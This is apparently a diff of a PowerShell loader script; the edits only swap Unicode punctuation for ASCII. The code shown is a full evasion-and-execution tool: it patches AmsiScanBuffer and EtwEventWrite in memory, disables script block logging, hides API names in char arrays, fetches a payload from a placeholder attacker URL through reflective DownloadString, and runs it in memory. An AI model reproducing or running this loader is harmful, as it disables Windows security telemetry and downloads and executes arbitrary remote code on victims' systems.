@@ -2,18 +2,18 @@
 # Downloads a payload over HTTP and executes it entirely in memory.
 #
 # Evasion layers:
-#   1. AmsiScanBuffer patch  — kills AMSI before any string is scanned
-#   2. EtwEventWrite patch   — kills ETW telemetry (script block + process events)
-#   3. Script block logging  — disabled via ETW provider reflection
+#   1. AmsiScanBuffer patch  - kills AMSI before any string is scanned
+#   2. EtwEventWrite patch   - kills ETW telemetry (script block + process events)
+#   3. Script block logging  - disabled via ETW provider reflection
 #   4. No IEX / Invoke-Expression literals
-#   5. No DownloadString literal — method called via reflection
+#   5. No DownloadString literal - method called via reflection
 #   6. All sensitive strings built from char arrays at runtime
 
-# ── Config ────────────────────────────────────────────────────────────────────
+# -- Config --------------------------------------------------------------------
 $PayloadUrl = "http://<IP>/payload.ps1"
-# ─────────────────────────────────────────────────────────────────────────────
+# -----------------------------------------------------------------------------
 
-# ── Helper: resolve exported function address via System.dll reflection ───────
+# -- Helper: resolve exported function address via System.dll reflection -------
 function LookupFunc {
     Param($mod, $fn)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
@@ -25,7 +25,7 @@ function LookupFunc {
     return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($mod)), $fn))
 }
 
-# ── Helper: build delegate type for unmanaged function pointer ────────────────
+# -- Helper: build delegate type for unmanaged function pointer ----------------
 function MakeDelegate {
     Param([Type[]]$func, [Type]$ret = [Void])
     $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
@@ -43,9 +43,9 @@ function MakeDelegate {
     return $type.CreateType()
 }
 
-# ── Helper: VirtualProtect wrapper ───────────────────────────────────────────
+# -- Helper: VirtualProtect wrapper -------------------------------------------
 function Get-VpDelegate {
-    # "kernel32.dll" + "VirtualProtect" — char arrays only
+    # "kernel32.dll" + "VirtualProtect" - char arrays only
     $k32 = [string]::Join('', [char[]]@(107,101,114,110,101,108,51,50,46,100,108,108))
     $vp  = [string]::Join('', [char[]]@(86,105,114,116,117,97,108,80,114,111,116,101,99,116))
     return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
@@ -54,7 +54,7 @@ function Get-VpDelegate {
     )
 }
 
-# ── 1. AMSI bypass — patch AmsiScanBuffer → always return E_INVALIDARG ────────
+# -- 1. AMSI bypass - patch AmsiScanBuffer -> always return E_INVALIDARG --------
 function Bypass-Amsi {
     # "amsi.dll"
     $dll  = [string]::Join('', [char[]]@(97,109,115,105,46,100,108,108))
@@ -74,7 +74,7 @@ function Bypass-Amsi {
     $vpd.Invoke($funcAddr, 6, $old, [ref]$old) | Out-Null
 }
 
-# ── 2. ETW bypass — patch EtwEventWrite in ntdll → xor rax,rax ; ret ─────────
+# -- 2. ETW bypass - patch EtwEventWrite in ntdll -> xor rax,rax ; ret ---------
 function Bypass-Etw {
     # "ntdll.dll"
     $ntdll = [string]::Join('', [char[]]@(110,116,100,108,108,46,100,108,108))
@@ -92,7 +92,7 @@ function Bypass-Etw {
     $vpd.Invoke($funcAddr, 4, $old, [ref]$old) | Out-Null
 }
 
-# ── 3. Disable Script Block Logging via ETW provider reflection ───────────────
+# -- 3. Disable Script Block Logging via ETW provider reflection ---------------
 function Disable-SBL {
     # "System.Management.Automation.Tracing.PSEtwLogProvider"
     $typeName = [string]::Join('', [char[]]@(
@@ -112,7 +112,7 @@ function Disable-SBL {
     $provider.GetType().GetField($enaName, 'NonPublic,Instance').SetValue($provider, [System.UInt32]0)
 }
 
-# ── 4. Download payload via reflection (no DownloadString literal) ────────────
+# -- 4. Download payload via reflection (no DownloadString literal) ------------
 function Get-Payload {
     Param([String]$url)
     $wc = New-Object System.Net.WebClient
@@ -122,17 +122,17 @@ function Get-Payload {
     $ua  = [string]::Join('', [char[]]@(85,115,101,114,45,65,103,101,110,116))
     $wc.Headers.Add($ua, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
 
-    # Invoke DownloadString via reflection — avoids the literal string
+    # Invoke DownloadString via reflection - avoids the literal string
     $method = $wc.GetType().GetMethod('DownloadString', [Type[]]@([String]))
     return $method.Invoke($wc, @($url))
 }
 
-# ── Main ──────────────────────────────────────────────────────────────────────
+# -- Main ----------------------------------------------------------------------
 Bypass-Amsi
 Bypass-Etw
 Disable-SBL
 
 $code = Get-Payload -url $PayloadUrl
 
-# Execute in memory — no IEX or Invoke-Expression literal
+# Execute in memory - no IEX or Invoke-Expression literal
 & ([ScriptBlock]::Create($code))
